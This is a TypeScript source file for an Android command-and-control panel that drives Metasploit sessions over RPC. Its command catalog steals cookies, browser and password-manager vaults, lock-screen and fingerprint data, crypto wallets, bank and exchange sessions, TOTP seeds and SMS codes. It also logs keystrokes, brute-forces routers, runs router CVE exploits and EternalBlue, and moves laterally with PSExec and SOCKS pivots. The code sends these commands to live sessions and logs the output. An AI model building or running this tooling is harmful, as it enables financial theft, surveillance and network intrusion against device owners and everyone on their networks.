  { id: "gmsg_db",               name: "download /data/data/com.google.android.apps.messaging/databases/bugle_db", category: "Social", description: "Download Google Messages DB" },
  { id: "accounts_list",         name: "run post/android/gather/accounts",                                   category: "Social",    description: "List all synced accounts (Google, etc.)" },

  // ── Advanced COMMS Intel ──────────────────────────────────
  { id: "browser_cookies",       name: "run post/multi/gather/browser_cookies",                             category: "Social",    description: "Steal all browser session cookies" },
  { id: "saved_passwords",       name: "run post/multi/gather/browser_credentials",                         category: "Social",    description: "Dump all saved browser passwords" },
  { id: "wifi_passwords",        name: "run post/multi/gather/wifi_credentials",                            category: "Social",    description: "Dump all saved WiFi passwords" },
  { id: "google_auth_tokens",    name: "run post/android/gather/accounts",                                   category: "Social",    description: "Capture Google OAuth tokens" },
  { id: "app_sandbox_all",       name: "run post/android/capture/app_data",                                  category: "Social",    description: "Extract all installed app sandboxes (root)" },

  // ── Biometrics & Lock Screen ──────────────────────────────
  { id: "bio_dump_lock",         name: "run post/android/gather/lock_screen_info",                           category: "Biometrics", description: "Dump lock screen type, hash, salt, failed attempts" },
  { id: "bio_gesture_key",       name: "download /data/system/gesture.key",                                  category: "Biometrics", description: "Download pattern lock SHA1 hash file (root)" },
  { id: "bio_password_key",      name: "download /data/system/password.key",                                 category: "Biometrics", description: "Download PIN/password hash file (root)" },
  { id: "bio_locksettings",      name: "download /data/system/locksettings.db",                              category: "Biometrics", description: "Download lock settings SQLite DB (salt, type, bypass)" },
  { id: "bio_bypass_lock",       name: "run post/android/manage/lock_screen_bypass",                         category: "Biometrics", description: "Attempt MSF lock screen bypass module", dangerous: true },
  { id: "bio_fingerprint_dir",   name: "ls /data/system/users/0/fpdata/",                                    category: "Biometrics", description: "List fingerprint template files (root required)" },
  { id: "bio_fingerprint_dl",    name: "download -r /data/system/users/0/fpdata/",                           category: "Biometrics", description: "Download all fingerprint template files (root)" },
  { id: "bio_face_dir",          name: "ls /data/system_de/0/snap_face_data/",                               category: "Biometrics", description: "List face template files (root required)" },
  { id: "bio_iris_dir",          name: "ls /data/system/users/0/irisdata/",                                  category: "Biometrics", description: "List iris template files (Samsung, root)" },
  { id: "bio_gatekeeper",        name: "download -r /data/system/gatekeeper/",                               category: "Biometrics", description: "Download Gatekeeper token files (root)" },
  { id: "bio_enrollment_count",  name: "run post/android/gather/sub_info",                                   category: "Biometrics", description: "Check biometric enrollment status and count" },
  { id: "bio_samsung_pass",      name: "download /data/data/com.samsung.android.authfw/databases/",          category: "Biometrics", description: "Dump Samsung Pass credential database" },
  { id: "bio_screen_pin_check",  name: "run post/android/gather/lock_screen_info",                           category: "Biometrics", description: "Check if screen pin/lock is enabled" },
  { id: "bio_adb_unlock",        name: "execute -f /system/bin/sh -a '-c \"input keyevent 82\"'",           category: "Biometrics", description: "ADB keyevent screen wake/unlock attempt" },

  // ── Passkeys & Credential Vault ───────────────────────────
  { id: "passkey_keystore_list", name: "run post/android/gather/android_keystore_dumper",                   category: "Passkeys",  description: "List all Android Keystore key aliases" },
  { id: "passkey_chrome_db",    name: "download /data/data/com.android.chrome/app_chrome/Default/Login\\ Data", category: "Passkeys", description: "Download Chrome Login Data (passwords + passkeys)" },
  { id: "passkey_chrome_local",  name: "download /data/data/com.android.chrome/app_chrome/Local\\ State",   category: "Passkeys",  description: "Download Chrome Local State (WebAuthn)" },
  { id: "passkey_chrome_webdata",name: "download /data/data/com.android.chrome/app_chrome/Default/Web\\ Data", category: "Passkeys", description: "Download Chrome Web Data (autofill + passkeys)" },
  { id: "passkey_google_accounts",name:"run post/android/gather/accounts",                                   category: "Passkeys",  description: "List Google accounts (for passkey sync access)" },
  { id: "passkey_autofill_db",   name: "download /data/data/com.google.android.gms/databases/",             category: "Passkeys",  description: "Download Google Autofill / Smart Lock DB (root)" },
  { id: "passkey_firefox_db",    name: "download /data/data/org.mozilla.firefox/files/key4.db",              category: "Passkeys",  description: "Download Firefox key4.db (master key + logins)" },
  { id: "passkey_firefox_logins",name: "download /data/data/org.mozilla.firefox/files/logins.json",          category: "Passkeys",  description: "Download Firefox logins.json (encrypted creds)" },
  { id: "passkey_brave_db",      name: "download /data/data/com.brave.browser/app_chrome/Default/Login\\ Data", category: "Passkeys", description: "Download Brave browser credentials" },
  { id: "passkey_samsung_int",   name: "download /data/data/com.sec.android.app.sbrowser/databases/",       category: "Passkeys",  description: "Download Samsung Internet browser credentials" },
  { id: "passkey_1password",     name: "download /data/data/com.onepassword.android/databases/",             category: "Passkeys",  description: "Download 1Password encrypted vault DB" },
  { id: "passkey_bitwarden",     name: "download /data/data/com.x8bit.bitwarden/databases/",                 category: "Passkeys",  description: "Download Bitwarden encrypted vault DB" },
  { id: "passkey_keepass2",      name: "download -r /sdcard/",                                               category: "Passkeys",  description: "Search sdcard for .kdbx KeePass database files", needsParam: true, paramLabel: "Search path", paramPlaceholder: "/sdcard/" },

  // ── Non-custodial Crypto Wallets ──────────────────────────
  { id: "wallet_metamask",    name: "run post/android/capture/app_data -p io.metamask",                   category: "Finance",   description: "Extract MetaMask vault + preferences (ETH)" },
  { id: "wallet_trust",       name: "run post/android/capture/app_data -p com.wallet.crypto.trustapp",   category: "Finance",   description: "Extract Trust Wallet keystore (multi-chain)" },
  { id: "wallet_exodus",      name: "run post/android/capture/app_data -p exodusmovement.exodus",        category: "Finance",   description: "Extract Exodus wallet data" },
  { id: "wallet_coinbasew",   name: "run post/android/capture/app_data -p org.toshi",                    category: "Finance",   description: "Extract Coinbase Wallet (ETH/SOL)" },
  { id: "wallet_phantom",     name: "run post/android/capture/app_data -p app.phantom",                  category: "Finance",   description: "Extract Phantom wallet (Solana)" },
  { id: "wallet_rainbow",     name: "run post/android/capture/app_data -p me.rainbow",                   category: "Finance",   description: "Extract Rainbow wallet (ETH)" },
  { id: "wallet_imtoken",     name: "run post/android/capture/app_data -p im.token.app",                 category: "Finance",   description: "Extract imToken wallet (multi-chain)" },
  { id: "wallet_tokenpocket", name: "run post/android/capture/app_data -p vip.mytokenpocket",            category: "Finance",   description: "Extract TokenPocket wallet" },
  { id: "wallet_safepal",     name: "run post/android/capture/app_data -p io.safepal.wallet",            category: "Finance",   description: "Extract SafePal wallet" },
  { id: "wallet_mew",         name: "run post/android/capture/app_data -p com.myetherwallet.mewwallet",  category: "Finance",   description: "Extract MyEtherWallet data" },
  { id: "wallet_ledger",      name: "run post/android/capture/app_data -p com.ledger.live",              category: "Finance",   description: "Extract Ledger Live session data" },

  // ── Crypto Exchange Session Theft ─────────────────────────
  { id: "exch_binance",       name: "run post/android/capture/app_data -p com.binance.dev",              category: "Finance",   description: "Extract Binance session tokens + cookies" },
  { id: "exch_coinbase",      name: "run post/android/capture/app_data -p com.coinbase.android",         category: "Finance",   description: "Extract Coinbase session tokens" },
  { id: "exch_kraken",        name: "run post/android/capture/app_data -p com.kraken.trade",             category: "Finance",   description: "Extract Kraken session data" },
  { id: "exch_crypto_com",    name: "run post/android/capture/app_data -p co.mona.android",              category: "Finance",   description: "Extract Crypto.com session tokens" },
  { id: "exch_okx",           name: "run post/android/capture/app_data -p com.okinc.okex.gp",            category: "Finance",   description: "Extract OKX exchange session" },
  { id: "exch_bybit",         name: "run post/android/capture/app_data -p com.bybit.app",                category: "Finance",   description: "Extract Bybit session tokens" },
  { id: "exch_kucoin",        name: "run post/android/capture/app_data -p com.kubi.kucoin",              category: "Finance",   description: "Extract KuCoin session data" },

  // ── Banking & Payment Apps ────────────────────────────────
  { id: "bank_paypal",        name: "run post/android/capture/app_data -p com.paypal.android.p2pmobile",category: "Finance",   description: "Extract PayPal session + saved cards" },
  { id: "bank_cashapp",       name: "run post/android/capture/app_data -p com.squareup.cash",            category: "Finance",   description: "Extract Cash App session data" },
  { id: "bank_venmo",         name: "run post/android/capture/app_data -p com.venmo",                    category: "Finance",   description: "Extract Venmo session + bank link" },
  { id: "bank_revolut",       name: "run post/android/capture/app_data -p com.revolut.revolut",          category: "Finance",   description: "Extract Revolut session tokens" },
  { id: "bank_wise",          name: "run post/android/capture/app_data -p com.transferwise.android",     category: "Finance",   description: "Extract Wise transfer session" },
  { id: "bank_chime",         name: "run post/android/capture/app_data -p com.onedebit.chime",           category: "Finance",   description: "Extract Chime session data" },
  { id: "bank_chase",         name: "run post/android/capture/app_data -p com.chase.sig.android",        category: "Finance",   description: "Extract Chase bank session (root)" },
  { id: "bank_bofa",          name: "run post/android/capture/app_data -p com.bankofamerica.mobile",     category: "Finance",   description: "Extract Bank of America session (root)" },
  { id: "bank_wells",         name: "run post/android/capture/app_data -p com.wf.wellsfargomobile",      category: "Finance",   description: "Extract Wells Fargo session (root)" },

  // ── 2FA / TOTP Seed Extraction ────────────────────────────
  { id: "totp_gauth",         name: "download /data/data/com.google.android.apps.authenticator2/databases/databases", category: "Finance", description: "Download Google Authenticator TOTP DB (root)" },
  { id: "totp_authy",         name: "run post/android/capture/app_data -p com.authy.authy",              category: "Finance",   description: "Extract Authy encrypted TOTP backup" },
  { id: "totp_ms_auth",       name: "run post/android/capture/app_data -p com.azure.authenticator",      category: "Finance",   description: "Extract Microsoft Authenticator data" },
  { id: "totp_2fas",          name: "download /data/data/com.twofasapp/databases/",                      category: "Finance",   description: "Download 2FAS TOTP database" },
  { id: "totp_aegis",         name: "download /data/data/com.beemdevelopment.aegis/files/aegis.json",    category: "Finance",   description: "Download Aegis TOTP vault JSON" },
  { id: "totp_andotp",        name: "download /data/data/org.shadowice.flocke.andotp/files/",            category: "Finance",   description: "Download andOTP TOTP backup" },

  // ── Clipboard / Address Hijack ────────────────────────────
  { id: "fin_clipboard_get",   name: "clipboard_get",                                                     category: "Finance",   description: "Get current clipboard content (live)" },
  { id: "fin_clipboard_watch", name: "keyscan_start",                                                     category: "Finance",   description: "Start keylogger to capture financial credentials" },
  { id: "fin_screenshot_wallet",name: "screenshot",                                                       category: "Finance",   description: "Screenshot wallet balance / seed display" },
  { id: "fin_screen_record",   name: "run post/android/capture/screen_capture",                           category: "Finance",   description: "Capture screen during wallet/banking session" },
  { id: "fin_sms_otp",         name: "dump_sms",                                                          category: "Finance",   description: "Dump SMS for OTP codes / bank notifications" },
  { id: "fin_contacts_bank",   name: "dump_contacts",                                                     category: "Finance",   description: "Dump contacts for bank account / routing numbers" },

  // ── LAN Discovery ─────────────────────────────────────────
  { id: "net_arp_scan",        name: "run post/multi/gather/arp_scanner RHOSTS=192.168.1.0/24",           category: "Network",   description: "ARP scan local subnet — discover all LAN hosts", needsParam: true, paramLabel: "CIDR", paramPlaceholder: "192.168.1.0/24" },
  { id: "net_ping_sweep",      name: "run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24",            category: "Network",   description: "ICMP ping sweep across subnet", needsParam: true, paramLabel: "CIDR", paramPlaceholder: "192.168.1.0/24" },
  { id: "net_port_scan",       name: "run auxiliary/scanner/portscan/tcp RHOSTS=192.168.1.1 PORTS=80,443,445,22,3389", category: "Network", description: "TCP port scan through pivot", needsParam: true, paramLabel: "Host + ports", paramPlaceholder: "192.168.1.100 22,80,445" },
  { id: "net_smb_scan",        name: "run auxiliary/scanner/smb/smb_version RHOSTS=192.168.1.0/24",       category: "Network",   description: "Scan for Windows SMB/Samba hosts" },
  { id: "net_ssh_scan",        name: "run auxiliary/scanner/ssh/ssh_version RHOSTS=192.168.1.0/24",       category: "Network",   description: "Detect SSH-enabled hosts on LAN" },
  { id: "net_netbios",         name: "run auxiliary/scanner/netbios/nbname RHOSTS=192.168.1.0/24",        category: "Network",   description: "NetBIOS name scan — Windows host discovery" },
  { id: "net_udp_probe",       name: "run auxiliary/scanner/discovery/udp_probe RHOSTS=192.168.1.0/24",   category: "Network",   description: "UDP service probe for device discovery" },
  { id: "net_mdns",            name: "run auxiliary/scanner/mdns/mdns_query RHOSTS=224.0.0.251",          category: "Network",   description: "mDNS scan — find Apple/IoT devices" },
  { id: "net_snmp",            name: "run auxiliary/scanner/snmp/snmp_enum RHOSTS=192.168.1.0/24",        category: "Network",   description: "SNMP enumeration — routers, switches, printers" },

  // ── WiFi Intelligence ─────────────────────────────────────
  { id: "net_wifi_creds",      name: "run post/multi/gather/wifi_credentials",                            category: "Network",   description: "Dump all saved WiFi passwords from device" },
  { id: "net_wifi_scan",       name: "execute -f /system/bin/sh -a '-c \"iwlist wlan0 scan\"'",          category: "Network",   description: "Scan nearby WiFi networks (SSID, BSSID, signal)" },
  { id: "net_wifi_conf",       name: "download /data/misc/wifi/WifiConfigStore.xml",                     category: "Network",   description: "Download Android WiFi config store (passwords)" },
  { id: "net_wpa_supplicant",  name: "download /data/misc/wifi/wpa_supplicant.conf",                     category: "Network",   description: "Download wpa_supplicant.conf (older Android WiFi)" },
  { id: "net_wifi_dump_android",name:"dump_wifi",                                                          category: "Network",   description: "Meterpreter dump_wifi — saved WiFi passwords" },

  // ── Router Hook ───────────────────────────────────────────
  { id: "net_router_detect",   name: "execute -f /system/bin/sh -a '-c \"ip route | grep default\"'",   category: "Network",   description: "Detect default gateway (router IP)" },
  { id: "net_router_brute",    name: "run auxiliary/scanner/http/http_login RHOSTS=192.168.1.1 RPORT=80 USERPASS_FILE=/usr/share/metasploit-framework/data/wordlists/router_default_userpass.txt", category: "Network", description: "Brute-force router admin with default credentials", needsParam: true, paramLabel: "Router IP", paramPlaceholder: "192.168.1.1" },
  { id: "net_router_dns",      name: "execute -f /system/bin/sh -a '-c \"nslookup google.com 192.168.1.1\"'", category: "Network", description: "Test router DNS resolution" },
  { id: "net_upnp",            name: "run auxiliary/scanner/upnp/ssdp_msearch RHOSTS=192.168.1.0/24",    category: "Network",   description: "UPnP/SSDP discovery — routers + IoT devices" },
  { id: "net_router_cve_tp",   name: "run exploit/linux/http/tplink_archer_telnet_enable RHOSTS=192.168.1.1", category: "Network", description: "TP-Link Archer auth bypass + telnet enable" },
  { id: "net_router_cve_ng",   name: "run exploit/linux/http/netgear_r7000_cgibin_exec RHOSTS=192.168.1.1",  category: "Network", description: "Netgear R7000 remote command injection CVE" },

  // ── Pivot / SOCKS ─────────────────────────────────────────
  { id: "net_autoroute",       name: "run post/multi/manage/autoroute SUBNET=192.168.1.0 NETMASK=255.255.255.0", category: "Network", description: "Setup autoroute pivot through session", needsParam: true, paramLabel: "Subnet/Mask", paramPlaceholder: "192.168.1.0 255.255.255.0" },
  { id: "net_socks_start",     name: "use auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 5\nrun -j", category: "Network", description: "Start SOCKS5 proxy through session (port 1080)" },
  { id: "net_portfwd_add",     name: "portfwd add -l 8080 -r 192.168.1.1 -p 80",                         category: "Network",   description: "Forward local port to internal host", needsParam: true, paramLabel: "lport:rhost:rport", paramPlaceholder: "8080:192.168.1.1:80" },
  { id: "net_portfwd_list",    name: "portfwd list",                                                      category: "Network",   description: "List all active port forwards" },

  // ── Lateral Movement (Spread) ─────────────────────────────
  { id: "net_smb_exploit",     name: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nrun", category: "Network", description: "EternalBlue SMB exploit → Windows SYSTEM", needsParam: true, paramLabel: "Target IP", paramPlaceholder: "192.168.1.100", dangerous: true },
  { id: "net_ssh_brute",       name: "run auxiliary/scanner/ssh/ssh_login RHOSTS=192.168.1.100 USERNAME=root PASS_FILE=/usr/share/wordlists/rockyou.txt", category: "Network", description: "SSH brute force on LAN host", needsParam: true, paramLabel: "Target IP", paramPlaceholder: "192.168.1.100" },
  { id: "net_psexec",          name: "use exploit/windows/smb/psexec\nset RHOSTS 192.168.1.100\nrun",    category: "Network",   description: "PSExec lateral movement (needs SMB creds)", needsParam: true, paramLabel: "Target IP", paramPlaceholder: "192.168.1.100", dangerous: true },
  { id: "net_wmi_exec",        name: "run post/windows/manage/wmic RHOSTS=192.168.1.100",                category: "Network",   description: "WMI remote execution on Windows host" },
  { id: "net_rdp_brute",       name: "run auxiliary/scanner/rdp/rdp_login RHOSTS=192.168.1.100 USERNAME=administrator", category: "Network", description: "Brute RDP credentials on LAN target", needsParam: true, paramLabel: "Target IP", paramPlaceholder: "192.168.1.100" },
  { id: "net_shell_to_meterp", name: "run post/multi/manage/shell_to_meterpreter",                       category: "Network",   description: "Upgrade shell session to Meterpreter" },
  { id: "net_enum_shares",     name: "run post/windows/gather/enum_shares",                               category: "Network",   description: "Enumerate accessible SMB network shares" },
  { id: "net_enum_computers",  name: "run post/windows/gather/enum_computers",                            category: "Network",   description: "Enumerate all computers in Active Directory domain" },
];

export function getCommandsByCategory(): Record<string, C2Command[]> {
  const groups: Record<string, C2Command[]> = {};
  for (const cmd of COMMAND_CATALOG) {
    if (!groups[cmd.category]) groups[cmd.category] = [];
    groups[cmd.category].push(cmd);
  }
  return groups;
}

export function getCommand(id: string): C2Command | undefined {
  return COMMAND_CATALOG.find((c) => c.id === id);
}

export function getAllCommands(): C2Command[] {
  return [...COMMAND_CATALOG];
}

// ── Live MSF Session Command Execution ───────────────────────

/**
 * Write a command to a Meterpreter or shell session and read the output.
 * Tries meterpreter protocol first, falls back to raw shell protocol.
 * For multi-line commands (like load kiwi + creds_all), each line is sent separately.
 */
async function rawSessionCommand(sessionId: number, command: string): Promise<C2Result> {
  const token = await getRpcToken();
  const lines = command.split("\n").filter((l) => l.trim());

  try {
    let output = "";

    for (const line of lines) {
      // Write line
      await rpcCall("session.meterpreter_write", [sessionId, line + "\n"], token);
      // Wait for processing
      await new Promise((r) => setTimeout(r, 1500));

      // Read with retries until output stabilizes
      for (let i = 0; i < 5; i++) {
        const res = await rpcCall<{ data?: string; type?: string }>(
          "session.meterpreter_read", [sessionId], token,
        );
        if (res.data && res.data.length > 0) {
          output += res.data;
        }
        // Stop reading if type is "response" or no more data
        if (res.type === "response" || !res.data) break;
        await new Promise((r) => setTimeout(r, 500));
      }
    }

    return {
      success: true,
      output: output || "(command sent — no output returned)",
      data: { sessionId, command },
    };
  } catch (meterErr) {
    // Fall back to shell session protocol
    try {
      let output = "";
      for (const line of lines) {
        await rpcCall("session.shell_write", [sessionId, line + "\n"], token);
        await new Promise((r) => setTimeout(r, 1500));
        const res = await rpcCall<{ data?: string; seq?: number }>(
          "session.shell_read", [sessionId], token,
        );
        output += res.data ?? "";
      }
      return {
        success: true,
        output: output || "(shell command sent)",
        data: { sessionId, command },
      };
    } catch (shellErr) {
      return {
        success: false,
        output: "",
        error: `Session write failed: ${meterErr instanceof Error ? meterErr.message : "unknown"}`,
      };
    }
  }
}

export async function executeC2Command(
  sessionId: number,
  commandId: string,
  param?: string,
  deviceId?: string,
): Promise<C2Result> {
  const cmd = getCommand(commandId);
  if (!cmd) {
    return { success: false, output: "", error: `Unknown command: ${commandId}` };
  }

  let fullCommand = cmd.name;
  if (param && cmd.needsParam) {
    // Replace the placeholder argument in the command with the actual param
    if (fullCommand.includes(" ")) {
      fullCommand = `${fullCommand} ${param}`;
    } else {
      fullCommand = `${fullCommand} ${param}`;
    }
  }

  const result = await rawSessionCommand(sessionId, fullCommand);

  // Log to Supabase (fire-and-forget)
  if (deviceId) {
    import("../supabase").then(({ logCommand, queueOffline }) => {
      logCommand(deviceId, sessionId, fullCommand, result.output, result.success, commandId)
        .catch(() =>
          queueOffline("command", {
            device_id: deviceId, session_id: sessionId, command: fullCommand,
            output: result.output, success: result.success, command_id: commandId,
          })
        );
    }).catch(() => {});
  }

  return result;
}

export async function executeCustomCommand(
  sessionId: number,
  command: string,
  deviceId?: string,
): Promise<C2Result> {
  const result = await rawSessionCommand(sessionId, command);

  if (deviceId) {
    import("../supabase").then(({ logCommand, queueOffline }) => {
      logCommand(deviceId, sessionId, command, result.output, result.success)
        .catch(() =>
          queueOffline("command", {
            device_id: deviceId, session_id: sessionId, command,
            output: result.output, success: result.success,
          })
        );
    }).catch(() => {});
  }

  return result;
}

// ── List sessions ─────────────────────────────────────────────

export async function listAgentSessions(): Promise<AgentSession[]> {
  try {
    const token = await getRpcToken();
    const result = await rpcCall<Record<string, Record<string, string>>>(
      "session.list", [], token,
    );

    if (!result || Object.keys(result).length === 0) return [];

    return Object.entries(result).map(([id, session]) => ({
      id: Number(id),
      type:       session.type ?? "unknown",
      tunnel:     session.tunnel_peer ?? session.tunnel_local ?? "—",
      via:        session.via_exploit ?? "—",
      info:       session.info ?? "—",
      workspace:  session.workspace ?? "default",
      lastSeen:   new Date().toISOString(),
      platform:   session.platform ?? session.os_name ?? "unknown",
      arch:       session.arch ?? "unknown",
      username:   session.username ?? session.info?.split(" @")?.[0] ?? "—",
      remoteHost: session.tunnel_peer?.split(":")?.[0] ?? "—",
    }));
  } catch {
    return [];
  }
}

// ── Session detail & control ──────────────────────────────────

export async function killSession(sessionId: number): Promise<void> {
  const token = await getRpcToken();
  await rpcCall("session.stop", [sessionId], token);
}

export async function upgradeSession(sessionId: number): Promise<C2Result> {
  return rawSessionCommand(sessionId, "run post/multi/manage/shell_to_meterpreter");
}
